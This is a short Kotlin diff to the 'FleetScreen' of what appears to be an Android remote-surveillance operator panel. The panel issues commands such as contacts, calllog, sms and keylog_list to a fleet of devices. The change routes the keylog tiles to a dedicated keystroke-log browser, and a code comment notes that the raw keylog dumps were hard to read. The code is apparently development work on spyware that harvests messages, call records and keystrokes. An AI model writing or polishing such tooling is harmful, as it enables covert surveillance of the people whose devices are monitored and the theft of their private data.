@@ -61,7 +61,7 @@ private data class LogLine(
  * data screen (searchable, row-per-record) instead of a log line.
  */
 private val DATA_COMMANDS = setOf(
-    "contacts", "calllog", "sms", "keylog_file", "keylog_list", "perms", "apps"
+    "contacts", "calllog", "sms", "perms", "apps"
 )
 
 private val DATA_ROUTES = mapOf(
@@ -415,7 +415,15 @@ fun FleetScreen(
                 ActionData("Keylog Files", Icons.Default.Folder, AccentPurple, "keylog_list"),
             ),
             inFlight = inFlight,
-            onRun = { a -> run(a.command, "{}", a.label) }
+            onRun = { a ->
+                // The two keylog tiles used to dump either a raw file or a bare
+                // filename into the generic data screen, which was unreadable and
+                // unopenable. They now open the keylog browser without a round
+                // trip first -- it loads its own day list.
+                if (a.command == "keylog_file" || a.command == "keylog_list")
+                    onCapability("keylog")
+                else run(a.command, "{}", a.label)
+            }
         )
 
         // ---- automation / permissions ---------------------------------------
